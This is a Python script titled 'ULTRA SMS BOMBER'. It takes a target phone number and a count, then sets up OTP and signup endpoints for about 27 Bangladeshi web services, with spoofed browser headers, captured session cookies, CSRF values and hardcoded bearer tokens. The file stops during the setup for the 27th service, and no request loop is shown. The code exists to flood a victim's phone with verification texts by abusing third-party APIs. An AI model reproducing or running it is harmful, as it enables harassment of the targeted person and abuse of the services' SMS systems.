import os

try: 
    import requests

except:
    os.system("pip install requests")

import requests
from requests.structures import CaseInsensitiveDict

biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White

os.system("clear")

# Intro 

print(bigreen+"""

   ___ _                      _           _
  / __\ |__   __ _ _ __   ___| |__   __ _| |
 / /  | '_ \ / _` | '_ \ / __| '_ \ / _` | |
/ /___| | | | (_| | | | | (__| | | | (_| | |
\____/|_| |_|\__,_|_| |_|\___|_| |_|\__,_|_|

═══════════════════════════════════════════════
 Tools Name : ULTRA SMS BOMBER
 Author : CHANCHAL ISLAM
 Contact :- xhanxhal.github.io/linktree/
═══════════════════════════════════════════════

""")

# Input 

number=str(input("\nEnter Number Here:- "))
amount=int(input("\nEnter Amount Here:- "))


# 1. Bikroy - Get

url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number

headers1 = CaseInsensitiveDict()
headers1["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers1["Accept"] = "application/json, text/plain, */*"
headers1["Accept-Language"] = "bn"
headers1["Accept-Encoding"] = "gzip, deflate, br"
headers1["Application-name"] = "web"
headers1["DNT"] = "1"
headers1["Sec-GPC"] = "1"
headers1["Connection"] = "keep-alive"
headers1["Referer"] = "https://bikroy.com/bn?login-modal=true&redirect-url=/bn"
headers1["Cookie"] = "ab-test.pwa-only=reactapp; locale=bn; _gcl_au=1.1.1237574387.1695022722; _sp_ses.c10b=*; _sp_id.c10b=f1a9873c99ff4b82.1695022722.1.1695022961.1695022722.e6b24a1d-e8d1-47ed-b0d4-da3d4b555110; _ga_LV7HJQBLZX=GS1.1.1695022722.1.1.1695022960.60.0.0; _ga=GA1.1.144870622.1695022722"
headers1["Sec-Fetch-Dest"] = "empty"
headers1["Sec-Fetch-Mode"] = "cors"
headers1["Sec-Fetch-Site"] = "same-origin"
headers1["Pragma"] = "no-cache"
headers1["Cache-Control"] = "no-cache"
headers1["TE"] = "trailers"

# 2. bdticket - Post

url2 = "https://api.bdtickets.com:20100/v1/auth"

headers2 = CaseInsensitiveDict()
headers2["Host"] = "api.bdtickets.com:20100"
headers2["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers2["Accept"] = "application/json, text/plain, */*"
headers2["Accept-Language"] = "en-US,en;q=0.5"
headers2["Accept-Encoding"] = "gzip, deflate, br"
headers2["Content-Type"] = "application/json"
headers2["Origin"] = "https://bdtickets.com"
headers2["DNT"] = "1"
headers2["Sec-GPC"] = "1"
headers2["Connection"] = "keep-alive"
headers2["Referer"] = "https://bdtickets.com/"
headers2["Sec-Fetch-Dest"] = "empty"
headers2["Sec-Fetch-Mode"] = "cors"
headers2["Sec-Fetch-Site"] = "same-site"
headers2["Pragma"] = "no-cache"
headers2["Cache-Control"] = "no-cache"
headers2["TE"] = "trailers"

data2 = '{"createUserCheck":true,"phoneNumber":"+88'+number+'","applicationChannel":"WEB_APP"}'

# 3. Health Plus - Get

url3 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number

# 4. RedX - Post

url4 = "https://api.redx.com.bd/v1/user/signup"

headers4 = CaseInsensitiveDict()
headers4["Host"] = "api.redx.com.bd"
headers4["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers4["Accept"] = "application/json, text/plain, */*"
headers4["Accept-Language"] = "en-US,en;q=0.5"
headers4["Accept-Encoding"] = "gzip, deflate, br"
headers4["Referer"] = "https://redx.com.bd/"
headers4["Content-Type"] = "application/json"
headers4["Origin"] = "https://redx.com.bd"
headers4["Connection"] = "keep-alive"

data4 = '{"name":"'+number+'","phoneNumber":"'+number+'","service":"redx"}'

# 5. Binge -Get

url5 = "https://web-api.binge.buzz/api/v3/otp/send/+88"+number

headers5 = CaseInsensitiveDict()
headers5["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers5["Accept"] = "application/json, text/plain, */*"
headers5["Accept-Language"] = "en-US,en;q=0.5"
headers5["Accept-Encoding"] = "gzip, deflate, br"
headers5["Referer"] = "https://binge.buzz/"
headers5["Origin"] = "https://binge.buzz"
headers5["DNT"] = "1"
headers5["Sec-GPC"] = "1"
headers5["Connection"] = "keep-alive"
headers5["Sec-Fetch-Dest"] = "empty"
headers5["Sec-Fetch-Mode"] = "no-cors"
headers5["Sec-Fetch-Site"] = "same-site"
headers5["Authorization"] = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNjk1MDI1MDg5LCJleHAiOjE2OTUxOTc4ODl9.Q71tPrRSFsZIBOD999cLpqSGQIkEOpZ79DkfNHOkxvM"
headers5["Device-Type"] = "web"
headers5["Pragma"] = "no-cache"
headers5["Cache-Control"] = "no-cache"

# 6. Bioscope Live -Post

url6 = "https://api3.bioscopelive.com/auth/api/v2/login/send-otp"

headers6 = CaseInsensitiveDict()
headers6["Host"] = "api3.bioscopelive.com"
headers6["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers6["Accept"] = "*/*"
headers6["Accept-Language"] = "en"
headers6["Accept-Encoding"] = "gzip, deflate, br"
headers6["Content-Type"] = "application/json"
headers6["Access-code"] = "QkQ%3D"
headers6["platform-id"] = "c3c98d1b-c581-452d-a385-941ca69401e9"
headers6["Country-Code"] = "QkQ%3D"
headers6["client-id"] = "c3c98d1b-c581-452d-a385-941ca69401e9"
headers6["Origin"] = "https://www.bioscopelive.com"
headers6["Connection"] = "keep-alive"
headers6["Referer"] = "https://www.bioscopelive.com/"

data6 = '{"operator":"all","msisdn":"88'+number+'","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE2OTg5MDExMDcuMH0.zT13KMjCsK7afD0nyxlThTb0ZGc7Jn0T7IzenKoFvsUJxtfBccNvkiyk-FRnSQh66buvqLjzL8p4CjGt0xYv8g","token_type":"CUSTOM_TOKEN_V1"}'

# 7. Miah -Post

url7 = "https://api.miah.shop/api/otp"

headers7 = CaseInsensitiveDict()
headers7["Host"] = "api.miah.shop"
headers7["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers7["Accept"] = "application/json, text/plain, */*"
headers7["Accept-Language"] = "en-US,en;q=0.5"
headers7["Accept-Encoding"] = "gzip, deflate, br"
headers7["Content-Type"] = "application/json"
headers7["X-XSRF-TOKEN"] = "eyJpdiI6ImY3Q1JLSmVMSWkrSFU2LzJWeTZlS1E9PSIsInZhbHVlIjoidmQ3MFNJRklnRXV3NVd6aUxkRFpJbmpZMkV0S1YyTE50L2xhRjRmSnpHSnMwQkF4ZzlaYTlDaVU0dk92bStrUlpzS0FUOWRnQTU0N1BUa1h0RldpbWVqN0VCZDk5R1FoTXlJRHJkTEFiT0hLK3hGeC9FUXRrcmtJbUxkSGFZUGciLCJtYWMiOiI3YmY0MjEzZGNkNmFhMjZjZjQ5MGMwNmQ1YWZkNTAyNTZlM2VkZDQ4MzU4MTg0MzUxZGQ5Y2U4Njg0MDE3OGQzIn0="
headers7["Content-Length"] = "56"
headers7["Origin"] = "https://miah.shop"
headers7["DNT"] = "1"
headers7["Sec-GPC"] = "1"
headers7["Connection"] = "keep-alive"
headers7["Referer"] = "https://miah.shop/"
headers7["Cookie"] = "XSRF-TOKEN=eyJpdiI6ImY3Q1JLSmVMSWkrSFU2LzJWeTZlS1E9PSIsInZhbHVlIjoidmQ3MFNJRklnRXV3NVd6aUxkRFpJbmpZMkV0S1YyTE50L2xhRjRmSnpHSnMwQkF4ZzlaYTlDaVU0dk92bStrUlpzS0FUOWRnQTU0N1BUa1h0RldpbWVqN0VCZDk5R1FoTXlJRHJkTEFiT0hLK3hGeC9FUXRrcmtJbUxkSGFZUGciLCJtYWMiOiI3YmY0MjEzZGNkNmFhMjZjZjQ5MGMwNmQ1YWZkNTAyNTZlM2VkZDQ4MzU4MTg0MzUxZGQ5Y2U4Njg0MDE3OGQzIn0%3D; laravel_session=eyJpdiI6IkxweHkxME83QzQxbUlpNWtLOWwvTEE9PSIsInZhbHVlIjoiMXpWZE9HZnNPTytNL1lDOVRmek53cUhlbmwzcFZueStwTWNpZ3ZUK1ZBUnpyVllNM2htVmdrWUpkalI4MzRXTEtDUzk2UE1mZWVlZVZreWsxTGVxTkNCMHEydnZ0alNTT0plWGdkbW9qU3k0L2RRZUphUWNNNkxOQU1qbHY3cnQiLCJtYWMiOiIzNzkyNTg1NjZkZWYxNGY0NGUxZWU4M2FjODZjYzEwMjZmZDZhYmI5ZTYwYWMwZmU1MzJhMWYyZGIzMDJkZWMyIn0%3D; _gcl_au=1.1.202547019.1694799125; _ga_J4TDD249F0=GS1.1.1694799125.1.1.1694799398.48.0.0; _ga=GA1.1.166644032.1694799125; _ga_5J2Z1D8SVS=GS1.1.1694799126.1.1.1694799398.48.0.0"
headers7["Sec-Fetch-Dest"] = "empty"
headers7["Sec-Fetch-Mode"] = "cors"
headers7["Sec-Fetch-Site"] = "same-site"
headers7["Pragma"] = "no-cache"
headers7["Cache-Control"] = "no-cache"

data7 = '{"phone":"'+number+'","email":"jylajiv@mailinator.com"}'

# 8. Mokam



# 9. Quizgiri -Post

url9 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"

headers9 = CaseInsensitiveDict()
headers9["Content-Type"] = "application/json"

data9 = '{"phone": " '+number+' ","country_code": "+880","fcm_token": null}'


# 10. SkyBuy -Post

url10 = "https://api.skybuybd.com/v1/customer/auth"

headers10 = CaseInsensitiveDict()
headers10["Host"] = "api.skybuybd.com"
headers10["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers10["Accept"] = "application/json, text/plain, */*"
headers10["Accept-Language"] = "en-US,en;q=0.5"
headers10["Accept-Encoding"] = "gzip, deflate, br"
headers10["Content-Type"] = "application/json"
headers10["Origin"] = "https://skybuybd.com"
headers10["DNT"] = "1"
headers10["Sec-GPC"] = "1"
headers10["Connection"] = "keep-alive"
headers10["Referer"] = "https://skybuybd.com/"
headers10["Sec-Fetch-Dest"] = "empty"
headers10["Sec-Fetch-Mode"] = "cors"
headers10["Sec-Fetch-Site"] = "same-site"
headers10["Pragma"] = "no-cache"
headers10["Cache-Control"] = "no-cache"
headers10["TE"] = "trailers"

data10 = '{"phone":"'+number+'","token":"ODYyODE5OTE1NDE="}'

# 11. SkyTrack -Post

url11 = "https://www.skytrackbd.com/ajax/LHZLLfEpaQVdK0qCYDletmxqfKmklEXMr5m"

headers11 = CaseInsensitiveDict()
headers11["Host"] = "www.skytrackbd.com"
headers11["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers11["Accept"] = "*/*"
headers11["Accept-Language"] = "en-US,en;q=0.5"
headers11["Accept-Encoding"] = "gzip, deflate, br"
headers11["Content-Type"] = "application/x-www-form-urlencoded"
headers11["X-CSRF-TOKEN"] = "oKo9IEzVqK1awSQyTxHcPa5c1vY7YxR8NnSHndL7"
headers11["X-Requested-With"] = "XMLHttpRequest"
headers11["Origin"] = "https://www.skytrackbd.com"
headers11["DNT"] = "1"
headers11["Sec-GPC"] = "1"
headers11["Alt-Used"] = "www.skytrackbd.com"
headers11["Connection"] = "keep-alive"
headers11["Referer"] = "https://www.skytrackbd.com/login"
headers11["Cookie"] = "XSRF-TOKEN=eyJpdiI6ImtvMDdQZUxxK1NYdWRpWjZJWjR1bFE9PSIsInZhbHVlIjoiUGQwTnd6bHQ4anU1YXMyV3FNTDduY0szdEE2NDFSOXhlOU9SU0tuUW5MbnArSlQvV3NMM3FmYkVWa0xqdFJValVRRWxUUzlldFRZZzlXTjk3N1E3Y3h4ZlpiYzhWSkxzeWRGY0lIVTQ5QjlEL25TcGNkRnpPMXFBMUJCTnViRlkiLCJtYWMiOiI3OGYxY2ZiMzc1YjE3YmMwNGFjMjQ3Y2M5NTQ3MTVjNmQ5NTZjYWZkZTk1ZGIzNGEzYjM4MjM2NTc1ZmJiNjFjIiwidGFnIjoiIn0%3D; skytrack_session=eyJpdiI6Im1DKzBmaTFHV0NzdHcyamtSb0RFeFE9PSIsInZhbHVlIjoiYUNXOUFrN2Qrb3kzTmYydldvMHdJdTlobVhQdUlVemNuaXMveGR4Q29UZVJadFE3RkpMdnREVEYvUmVjQ0Mza29WZzBEd0lBYjAxOFIrRkk0VEtKeVhZUXNqMnIvTnFJVGYyZVMxK1VoSmdTSDdTd3FLb09YcG15aEJnSzlYeVIiLCJtYWMiOiIwOWRlZGFjZTY1MzExMWQzMDIyNzcxMzU2OTExZDdlNzAzMzJiMTRjZmQzNDkxZjMyNTliNDZiZDkwNzBjZmU1IiwidGFnIjoiIn0%3D"

data11 = "phone="+number+"&remember=1"

# 12. China Pikary -Post

url12 = "https://api.chinapaikary.com/v1/customer/auth"

headers12 = CaseInsensitiveDict()
headers12["Host"] = "api.chinapaikary.com"
headers12["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers12["Accept"] = "application/json, text/plain, */*"
headers12["Accept-Language"] = "en-US,en;q=0.5"
headers12["Accept-Encoding"] = "gzip, deflate, br"
headers12["Content-Type"] = "application/json"
headers12["Content-Length"] = "50"
headers12["Origin"] = "https://chinapaikary.com"
headers12["DNT"] = "1"
headers12["Sec-GPC"] = "1"
headers12["Connection"] = "keep-alive"
headers12["Referer"] = "https://chinapaikary.com/"
headers12["Sec-Fetch-Dest"] = "empty"
headers12["Sec-Fetch-Mode"] = "cors"
headers12["Sec-Fetch-Site"] = "same-site"
headers12["Pragma"] = "no-cache"
headers12["Cache-Control"] = "no-cache"
headers12["TE"] = "trailers"

data12 = '{"phone":"'+number+'","token":"ODYyODE5OTE1NDE="}'

# 13. China Shop Bd -Post

url13 = "https://api.chinashipbd.com/v1/customer/auth"

headers13 = CaseInsensitiveDict()
headers13["Host"] = "api.chinashipbd.com"
headers13["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers13["Accept"] = "application/json, text/plain, */*"
headers13["Accept-Language"] = "en-US,en;q=0.5"
headers13["Accept-Encoding"] = "gzip, deflate, br"
headers13["Content-Type"] = "application/json"
headers13["Origin"] = "https://chinashipbd.com"
headers13["DNT"] = "1"
headers13["Sec-GPC"] = "1"
headers13["Connection"] = "keep-alive"
headers13["Referer"] = "https://chinashipbd.com/"
headers13["Sec-Fetch-Dest"] = "empty"
headers13["Sec-Fetch-Mode"] = "cors"
headers13["Sec-Fetch-Site"] = "same-site"
headers13["Pragma"] = "no-cache"
headers13["Cache-Control"] = "no-cache"
headers13["TE"] = "trailers"

data13 = '{"phone":"'+number+'","token":"ODYyODE5OTE1NDE="}'

# 14. Fundesh -Post

url14 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="

headers14 = CaseInsensitiveDict()
headers14["Host"] = "fundesh.com.bd"
headers14["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers14["Accept"] = "application/json, text/plain, */*"
headers14["Accept-Language"] = "en-US,en;q=0.5"
headers14["Accept-Encoding"] = "gzip, deflate, br"
headers14["Content-Type"] = "application/json"
headers14["Content-Length"] = "23"
headers14["Origin"] = "https://fundesh.com.bd"
headers14["DNT"] = "1"
headers14["Sec-GPC"] = "1"
headers14["Alt-Used"] = "fundesh.com.bd"
headers14["Connection"] = "keep-alive"
headers14["Referer"] = "https://fundesh.com.bd/fundesh/profile"
headers14["Cookie"] = "_ga_5LF4359FD3=GS1.1.1694802657.1.1.1694802682.35.0.0; _ga=GA1.1.1886988149.1694802657"
headers14["Sec-Fetch-Dest"] = "empty"
headers14["Sec-Fetch-Mode"] = "cors"
headers14["Sec-Fetch-Site"] = "same-origin"
headers14["Pragma"] = "no-cache"
headers14["Cache-Control"] = "no-cache"
headers14["TE"] = "trailers"

data14 = '{"msisdn":"'+number+'"}'

# 15. Paperfly -Post

url15 = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"

headers15 = CaseInsensitiveDict()
headers15["Host"] = "go-app.paperfly.com.bd"
headers15["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers15["Accept"] = "application/json, text/plain, */*"
headers15["Accept-Language"] = "en-US,en;"
headers15["Accept-Encoding"] = "gzip, deflate, br"
headers15["Content-Type"] = "application/json"
headers15["Origin"] = "https://go.paperfly.com.bd"
headers15["Connection"] = "keep-alive"
headers15["Referer"] = "https://go.paperfly.com.bd/"
headers15["TE"] = "trailers"

data15 = '{"full_name":"Sudo Su","company_name":"Linux","email_address":"kali@linux.com","phone_number":"'+number+'"}'

# 16. Rokomari -Get

url16 = "https://www.rokomari.com/otp/send?emailOrPhone=88"+number+"&countryCode=BD"

headers16 = CaseInsensitiveDict()
headers16["Content-Type"] = "application/json"

# 17. Swapno - Get

url17 = "https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+number+"&countryPhoneCode=%2B88"

headers17 = {
 "Host": "www.shwapno.com",
 "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
 "Accept": "*/*",
 "Accept-Language": "en-US,en;q=0.5",
 "Accept-Encoding": "gzip, deflate, br",
 "Referer": "https://www.shwapno.com/Registration/UserRegistration.aspx?ReturnUrl=https://www.shwapno.com/Default.aspx",
 "RequestVerificationToken": "16e4c67c-36ad-48e6-a67b-70aeed562aec",
 "X-Requested-With": "XMLHttpRequest",
 "DNT": "1",
 "Sec-GPC": "1",
 "Connection": "keep-alive",
 "Cookie": "__cf_bm=szPvmqe7gYbVJBklksBBBrt1YcU0Gda0.LpkoXY4vBA-1694807692-0-AZggRC8H8VZP2GLEkn3cDFmNBrR4ngA22RNfJLi0w9HAW9ZUZFt2rzIasMo3e/LQvAVYzb/3PncbzwGJj6CVhxI=; _gcl_au=1.1.273601566.1694807694; _ga_3R50MQ1P3H=GS1.1.1694807693.1.1.1694807741.12.0.0; _ga=GA1.1.2129553161.1694807694; CurrencyCode=BDT; ASP.NET_SessionId=32no1scq5vkae13qrlezgvv5; userName=Name:&Id:32no1scq5vkae13qrlezgvv5; antiForgeryToken=16e4c67c-36ad-48e6-a67b-70aeed562aec; JWTAntiForgeryToken=eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNobWFjLXNoYTI1NiIsInR5cCI6IkpXVCJ9.eyJ2ZXJpZmljYXRpb250b2tlbiI6ImNmNzgxNDAxLTdhMjMtNGFhNi05YWI4LWRhYTYxNzcxZDQ5ZCIsImV4cGlyZV9hdCI6IjkvMTYvMjAyMyAxOjM1OjI0IEFNIiwiY3JlYXRlZF9hdCI6IjkvMTYvMjAyMyAxOjI1OjI0IEFNIn0.c7oUKQA5Qph87ZiT1_302ABOFBCnz-l21Qbn0ensXE0",

}

# 18. eCourier -Get

url18 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile="+number

# 19. Meena -Post

url19 = "https://meenabazardev.com/api/front/send/otp"

headers19 = CaseInsensitiveDict()
headers19["Content-Type"] = "application/json"

data19 = '{"CellPhone":"'+number+'","type":"login"}'

# 20. Sindabad -Post

url20 = "https://offers.sindabad.com/api/check-magento-key"

headers20 = CaseInsensitiveDict()
headers20["Host"] = "offers.sindabad.com"
headers20["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers20["Accept"] = "application/json, text/plain, */*"
headers20["Accept-Language"] = "en-US,en;q=0.5"
headers20["Accept-Encoding"] = "gzip, deflate, br"
headers20["Referer"] = "https://sindabad.com/"
headers20["Content-Type"] = "application/json"
headers20["Authorization"] = "QZv#jCm#5fGVsg2ko6fE4r77pk2i%yd"
headers20["Origin"] = "https://sindabad.com"

data20 = '{"key":"c629ef996ea225e5c254226e462aa2b0","phone":"+88'+number+'"}'

# 21. Isho -Post

url21 = "https://www.isho.com/register_otp"

headers21 = {
 "Host": "www.isho.com",
 "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8",
 "Accept-Language": "en-US,en;q=0.5",
 "Accept-Encoding": "gzip, deflate, br",
 "Referer": "https://www.isho.com/register",
 "Content-Type": "application/x-www-form-urlencoded",
 "Origin": "https://www.isho.com",
 "DNT": "1",
 "Sec-GPC": "1",
 "Connection": "keep-alive",
 "Cookie": "XSRF-TOKEN=eyJpdiI6IlFkOHd5TE9uSXBsclpGYktOUjhIZ3c9PSIsInZhbHVlIjoiTGp5UHdrSXQzZStXXC9VYVBHeWErRk1LNjBzMERjTVluRXNJcFwvOGhRdXl5c2dSTU56UDM5UlRHZFhveTJ0OW90IiwibWFjIjoiZDA5MzVlY2E4MTRiYzg1ZmRhNDBmNzljMjVlOWNhYzZmODdjZGM1M2Q0NDcwMWQyOGFiMjJlYzRmOTgxZmM1MCJ9; fleetcart_session=eyJpdiI6IjZjcTkzZzU4aFZmM253dzlhUDllR2c9PSIsInZhbHVlIjoiRUlBR3htSlNaM1JvT1VrNnBTSGdiNFlMN1AxMEJMTWQyQ0NqckR0UlhiSmFkR2pEVGJzb1pOWmx1TWsrQkgyMSIsIm1hYyI6IjA0NzY3ZWU2NGJkYTUzMjBmOTdjZWVlOTZmZjM4YzEwOWI1NTEyZjFkYjE4Mzg2MDAzNzlkYjQyNzMwOWM1NmUifQ%3D%3D; _gcl_au=1.1.1357852415.1694813379; _ga_WQ9N1R30JT=GS1.1.1694813379.1.1.1694813388.51.0.0; _ga=GA1.1.436898724.1694813379; _ga_SXEHVHBLSB=GS1.1.1694813379.1.1.1694813388.51.0.0; cf_clearance=FGkEoVmXx1HbnOr5hhowBP6okSYdqp6i3ZuNCihMNgI-1694813378-0-1-7f65bcc.4b2f9ce6.50f7042c-0.2.1694813378" 
}

data21 = "_token=07X0ZSrtn7LetSyESiK9svUT9sHtWF1tlA71J2Bh&phone="+number

# 22. Focallure -Post

url22 = "https://focallurebangladesh.com/wp-admin/admin-ajax.php"

headers22 = CaseInsensitiveDict()
headers22["Content-Type"] = "application/x-www-form-urlencoded"

data22 = "g-web-reg-phone-cc=%252B88&g-web-reg-phone="+number+"&g-web-form-token=1369&g-web-csrf=a75fe37&g-web-form-type=register_user&email=01613324252%2540focallurebangladesh.com&woocommerce-register-nonce=565b48d035&_wp_http_referer=%252F&action=g_web_phone_register_form_submit&register=Register"

# 23. ShopZ -Post

url23 = "https://www.shopz.com.bd/wp-admin/admin-ajax.php"

headers23 = CaseInsensitiveDict()
headers23["Content-Type"] = "application/x-www-form-urlencoded"

data23 = "g-web-reg-phone-cc=%252B88&g-web-reg-phone="+number+"&g-web-form-token=1110&g-web-csrf=1fb4f5a&g-web-form-type=register_user&email=01613324252%2540www.shopz.com.bd&password=king!!1234&woocommerce-register-nonce=8eac4865d9&_wp_http_referer=%252Fmy-account%252F&action=g_web_phone_register_form_submit&register=Register"

# 24. Chardike

url24 = "https://api.chardike.com/api/otp/send"

headers24 = CaseInsensitiveDict()
headers24["Content-Type"] = "application/json"

data24 = '{"phone":"'+number+'","otp_type":"login"}'

# 25. Shoplover - Post 

url25 = "https://shoplover.com/users/otp-login-verify-page"

headers25 = CaseInsensitiveDict()
headers25["Host"] = "shoplover.com"
headers25["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers25["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8"
headers25["Accept-Language"] = "en-US,en;q=0.5"
headers25["Accept-Encoding"] = "gzip, deflate, br"
headers25["Content-Type"] = "application/x-www-form-urlencoded"
headers25["Origin"] = "https://shoplover.com"
headers25["Connection"] = "keep-alive"
headers25["Referer"] = "https://shoplover.com/users/login"
headers25["Cookie"] = "XSRF-TOKEN=5hXavETPmbwcS4WTX0XDQUSiaOwywCokyBiviEuW; shoplovercom_session=b4Vm1t47TqwlWSx81NApOpcGeYpv8rtlp2WUt855; b4Vm1t47TqwlWSx81NApOpcGeYpv8rtlp2WUt855=%7B%22data%22%3A%22a%3A4%3A%7Bs%3A6%3A%5C%22_token%5C%22%3Bs%3A40%3A%5C%225hXavETPmbwcS4WTX0XDQUSiaOwywCokyBiviEuW%5C%22%3Bs%3A6%3A%5C%22locale%5C%22%3Bs%3A2%3A%5C%22en%5C%22%3Bs%3A9%3A%5C%22_previous%5C%22%3Ba%3A1%3A%7Bs%3A3%3A%5C%22url%5C%22%3Bs%3A32%3A%5C%22http%3A%5C%2F%5C%2Fshoplover.com%5C%2Fusers%5C%2Flogin%5C%22%3B%7Ds%3A6%3A%5C%22_flash%5C%22%3Ba%3A2%3A%7Bs%3A3%3A%5C%22old%5C%22%3Ba%3A0%3A%7B%7Ds%3A3%3A%5C%22new%5C%22%3Ba%3A0%3A%7B%7D%7D%7D%22%2C%22expires%22%3A1695043797%7D; _ga_ZQPP58GH7F=GS1.1.1695036586.1.1.1695036600.46.0.0; _ga=GA1.1.176662853.1695036586; theme=light; acceptCookies=true"
headers25["Upgrade-Insecure-Requests"] = "1"
headers25["Sec-Fetch-Dest"] = "document"
headers25["Sec-Fetch-Mode"] = "navigate"
headers25["Sec-Fetch-Site"] = "same-origin"
headers25["Sec-Fetch-User"] = "?1"

data25 = "_token=5hXavETPmbwcS4WTX0XDQUSiaOwywCokyBiviEuW&phone="+number

# Bikroy -2 -Get

url26 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number

headers26 = CaseInsensitiveDict()
headers26["Host"] = "bikroy.com"
headers26["accept"] = "application/json, text/plain, */*"
headers26["accept-language"] = "bn"
headers26["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers26["application-name"] = "web"
headers26["x-requested-with"] = "mark.via.gp"
headers26["sec-fetch-site"] = "same-origin"
headers26["sec-fetch-mode"] = "cors"
headers26["sec-fetch-dest"] = "empty"
headers26["referer"] = "https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options"
headers26["accept-encoding"] = "gzip, deflate"
headers26["cookie"] = "ab-test.pwa-only=reactapp"

# 27. Daktarvai
url27 = "https://daktarbhai.com/login/mobile"

headers27 = CaseInsensitiveDict()
headers27["Host"] = "daktarbhai.com"
headers27["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
headers27["Accept"] = "*/*"
headers27["Accept-Language"] = "en-US,en;q=0.5"
headers27["Accept-Encoding"] = "gzip, deflate, br"
headers27["Referer"] = "https://daktarbhai.com/signin"
headers27["Content-Type"] = "application/x-www-form-urlencoded"
headers27["X-CSRF-TOKEN"] = "0t1XAq8OoHwwBgtUAreAb8t8QYUqZDTmrZNxUmVd"
headers27["X-Requested-With"] = "XMLHttpRequest"
headers27["Origin"] = "https://daktarbhai.com"
headers27["Connection"] = "keep-alive"
